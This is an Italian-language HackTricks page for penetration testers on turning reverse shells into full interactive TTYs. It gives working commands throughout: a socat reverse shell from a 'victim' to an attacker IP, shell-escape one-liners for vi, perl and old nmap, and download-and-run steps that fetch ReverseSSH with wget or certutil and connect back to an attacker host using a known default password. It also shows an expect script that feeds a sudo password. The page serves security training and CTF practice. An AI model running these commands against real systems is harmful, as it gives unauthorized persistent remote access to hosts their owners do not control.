# Full TTYs

{{#include ../../banners/hacktricks-training.md}}

## Full TTY

`/etc/shells` elenca i pathname delle login shell valide ed è consultato da alcuni programmi; non è un prerequisito universale per allocare una PTY.<sup>[[3]](#references)[[4]](#references)</sup> Se un programma come `pkexec` rifiuta `SHELL` con `The value for the SHELL variable was not found in the /etc/shells file`, assicurati che il percorso esatto della shell (ad esempio, `/bin/bash`) compaia in `/etc/shells`.<sup>[[10]](#references)</sup> La sequenza di ripristino `CTRL+Z`/`fg` riportata di seguito usa il job control di Bash; se la shell corrente non è Bash, avvia Bash prima di usare quella sequenza.<sup>[[7]](#references)</sup>

#### Python

`pty.spawn` di Python avvia un programma connesso ai flussi standard di input, output ed error del processo corrente, fornendo a Bash un pseudo-terminale in questa sessione.<sup>[[4]](#references)</sup>
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
> [!TIP]
> Puoi ottenere il **numero** di **righe** e **colonne** eseguendo **`stty -a`**; `-a` stampa tutte le impostazioni correnti del terminale. L'output del comando è specifico del terminale, quindi usa i valori riportati dalla sessione corrente.<sup>[[11]](#references)</sup>

#### script

L'utility `script` registra una sessione del terminale; qui `/dev/null` scarta il typescript, `-q` sopprime i messaggi di avvio e completamento e `-c` esegue Bash invece della shell predefinita.<sup>[[5]](#references)</sup>
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
```
Dopo uno dei due metodi di PTY-spawn, sospendi la sessione Netcat e ripristinala usando la modalità raw locale, quindi configura l'ambiente e le dimensioni del terminale remoto:
```bash
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat

Il listener utilizza il terminale corrente in modalità raw con l'eco locale disabilitato e accetta connessioni TCP sulla porta 4444. Il comando sulla vittima alloca una pty, unisce stderr, crea una sessione, inoltra SIGINT e applica impostazioni sane del terminale; aggiungi `ctty` se il processo figlio necessita di un terminale di controllo.<sup>[[6]](#references)</sup>
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap (vecchie versioni con `--interactive`): `!sh`

L'escape di Nmap dipende dalla versione: nelle release successive Nmap ha rimosso la modalità `--interactive`, quindi `!sh` si applica solo alle vecchie versioni.<sup>[[13]](#references)</sup>

## ReverseSSH

Un modo pratico per ottenere **interactive shell access**, oltre a **file transfers** e **port forwarding**, consiste nel caricare sul target il server SSH staticamente collegato [ReverseSSH](https://github.com/Fahrj/reverse-ssh).<sup>[[1]](#references)</sup>

Di seguito è riportato un esempio per `x86` con il binary compresso con UPX pubblicato dal progetto. Per altre architetture o release artifacts, usa la [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/) come riferimento.<sup>[[1]](#references)</sup>

1. Prepara l'host locale per ricevere la connessione SSH in arrivo. In listener mode, `-l` abilita il listener e `-p 4444` seleziona la porta sulla quale accettare la connessione del target.<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) target Linux. Trasferisci lo stesso artefatto `upx_reverse-sshx86` in `/dev/shm/reverse-ssh` e rendilo eseguibile. `-p 4444` del target seleziona la porta del listener indicata sopra, mentre `kali@10.0.0.2` fornisce l'account e l'host utilizzati per connettersi.<sup>[[1]](#references)</sup>
```bash
/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Target Windows. PowerShell interattiva completa richiede Windows 10 build 17763; consulta il [README del progetto](https://github.com/Fahrj/reverse-ssh#features).<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
L'esempio per Windows usa `certutil` con `-f -urlcache`; Microsoft documenta `-f` come opzione per forzare il recupero di un URL e specifica che i parametri disponibili variano in base alla versione, quindi esegui `certutil -?` se questa forma non è disponibile.<sup>[[12]](#references)</sup>

- Dopo che la reverse connection ha esito positivo, il listener in reverse mode di ReverseSSH si associa di default alla porta `8888` (o al valore fornito con `-b`), e le connessioni in entrata accettano qualsiasi username con la password predefinita `letmeinbrudipls`. La shell remota viene eseguita con i privilegi dell'account che ha avviato `reverse-ssh(.exe)`.<sup>[[1]](#references)</sup>
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) aggiorna automaticamente le reverse shell Unix-like a PTY, ridimensiona i terminali Unix-like e registra le interazioni con la shell; per le shell Windows fornisce readline, ma non il ridimensionamento del terminale in tempo reale.<sup>[[2]](#references)</sup>

Esegui `penelope` per metterti in ascolto su `0.0.0.0:4444` per impostazione predefinita; le shell Unix-like in ingresso possono quindi essere aggiornate e registrate automaticamente.<sup>[[2]](#references)</sup>

## No TTY

Se per qualche motivo non riesci a ottenere un TTY completo, **puoi comunque interagire con i programmi** che richiedono input dell'utente. Nell'esempio seguente, Expect avvia `sudo`, attende la richiesta della password, invia la password e restituisce il controllo con `interact`; `sudo -S` legge la password dallo standard input. Usalo solo in un laboratorio autorizzato ed evita di inserire credenziali reali nella cronologia della shell o nei file sorgente.<sup>[[8]](#references)[[9]](#references)</sup>
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## References

- [1] [ReverseSSH - Server ssh collegato staticamente con funzionalità di reverse shell per CTF e simili](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Gestore della shell che automatizza alcune operazioni per semplificare la vita](https://github.com/brightio/penelope)
- [3] [shells(5) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man5/shells.5.html)
- [4] [Python `pty` — Documentazione Python](https://docs.python.org/3/library/pty.html)
- [5] [script(1) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man1/script.1.html)
- [6] [socat(1) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man1/socat.1.html)
- [7] [Manuale di riferimento di Bash — Controllo dei job](https://www.gnu.org/s/bash/manual/bash.html)
- [8] [sudo(8) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [9] [expect(1) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man1/expect.1.html)
- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
- [11] [stty(1) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man1/stty.1.html)
- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Registro delle modifiche di Nmap](https://nmap.org/changelog.html)
{{#include ../../banners/hacktricks-training.md}}
